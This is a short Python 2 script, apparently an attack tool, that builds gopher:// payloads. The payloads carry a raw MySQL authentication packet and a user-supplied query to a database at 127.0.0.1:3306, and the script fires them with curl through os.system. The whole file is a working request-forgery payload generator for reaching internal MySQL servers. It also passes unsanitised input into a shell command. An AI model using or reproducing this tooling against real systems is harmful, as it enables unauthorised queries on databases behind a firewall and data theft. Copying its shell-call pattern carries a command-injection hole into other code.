#coding: utf-8
#!/usr/bin/python
import os
import string


def encode(s):
	a = [s[i:i + 2] for i in range(0, len(s), 2)]
	return "gopher://127.0.0.1:3306/_%" + "%".join(a)

auth = "<hex_dump_authen>".encode('utf-8')
query = raw_input("Tell me query clause: ")
query_length = hex(len(query) + 1)[2:]
query = query.encode("hex")
payload = encode(auth + query_length + "00000003" + query)

print "Your payload: ", payload

os.system("curl " + payload + " --output out.txt --max-time 1")

with open("out.txt", "rb") as f:
	respond = f.read().strip()
	for b in respond:
		if b not in string.printable:
			respond = respond.replace(b, " ")

print respond
f.close()
